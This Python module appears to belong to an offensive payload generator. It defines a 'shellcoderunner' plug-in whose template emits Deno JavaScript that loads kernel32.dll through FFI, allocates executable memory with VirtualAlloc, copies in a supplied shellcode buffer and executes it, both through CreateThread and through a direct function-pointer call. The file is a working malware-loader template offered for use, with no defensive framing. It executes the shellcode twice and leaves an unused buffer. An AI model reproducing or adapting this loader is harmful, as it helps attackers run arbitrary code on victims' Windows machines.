from string import Template

class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """"""

    def template(self) -> str:
        return """
    {transformers}

    const kernel32Path = "C:\\\\Windows\\\\System32\\\\kernel32.dll";
    const kernel32 = Deno.dlopen(kernel32Path, {{
        VirtualAlloc: {{
            parameters: ["pointer", "usize", "u32", "u32"],
            result: "pointer",
        }},
        CreateThread: {{
            parameters: ["pointer", "usize", "pointer", "pointer", "u32", "pointer"],
            result: "pointer",
        }},
        WaitForSingleObject: {{
            parameters: ["pointer", "u32"],
            result: "u32",
        }},
    }});

    const address = kernel32.symbols.VirtualAlloc(null, {shellcodeSize}, 0x3000, 0x40);
    const view = Deno.UnsafePointerView.getArrayBuffer(address, {shellcodeSize});
    const destView = new Uint8Array(view);
    destView.set(shellcode);

    const threadIdBuffer = new Uint32Array(1);
    const hThread = kernel32.symbols.CreateThread(null, 0, address, null, 0, null);

    const fn = new Deno.UnsafeFnPointer(address, {{
        parameters: [],
        result: "void", // Adjust if your code returns a value (e.g., "i32")
    }});
        
    fn.call()        
    kernel32.symbols.WaitForSingleObject(hThread, 0xFFFFFFFF);

"""